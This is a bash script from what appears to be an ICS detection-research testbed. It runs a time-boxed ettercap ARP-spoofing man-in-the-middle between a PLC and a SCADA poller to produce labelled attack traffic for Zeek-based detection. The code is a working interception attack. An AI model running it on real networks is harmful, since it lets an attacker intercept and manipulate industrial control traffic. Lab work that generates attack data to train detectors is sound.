#!/usr/bin/env bash
# ============================================================================
#  mitm.sh  --  bounded ARP-spoofing man-in-the-middle between two victims
# ============================================================================
# ARP-poisons two hosts (default: the PLC and the benign SCADA poller) so their
# Modbus traffic is relayed through this attacker for a fixed duration, then
# cleanly restores. Requires a --privileged / NET_ADMIN attacker container.
#
# NOTE: a pure ARP MITM relays the victims' existing flows rather than
# originating new Modbus connections, so at the Zeek conn/modbus feature level it
# is the subtlest of the attack classes. It still emits attacker ARP traffic and
# is logged to the ledger; treat its flow-level detectability as an open question
# (L2 / ARP features may be needed) rather than assuming it is learned.
#
# Usage (inside the attacker container):
#   bash mitm.sh [victimA] [victimB] [duration_s]
#   default victimA=openplc  victimB=benign-scada  duration=20
# ============================================================================
set -uo pipefail

A="${1:-openplc}"
B="${2:-benign-scada}"
DUR="${3:-20}"
IFACE="${IFACE:-eth0}"

resolve() { getent hosts "$1" 2>/dev/null | awk '{print $1; exit}'; }
IPA="$(resolve "$A")"; IPB="$(resolve "$B")"

if [ -z "$IPA" ] || [ -z "$IPB" ]; then
  echo "[!] could not resolve victims: $A=$IPA $B=$IPB (is $B running?)"; exit 1
fi

echo "[*] MITM ARP-spoof $A($IPA) <-> $B($IPB) for ${DUR}s on $IFACE"
echo 1 > /proc/sys/net/ipv4/ip_forward 2>/dev/null || true

# ettercap text mode, targeted ARP remote MITM, time-boxed
timeout "$DUR" ettercap -T -q -i "$IFACE" -M arp:remote "/$IPA//" "/$IPB//" \
  >/dev/null 2>&1 || true

echo "[*] MITM window finished -- ARP tables restored by ettercap on exit."
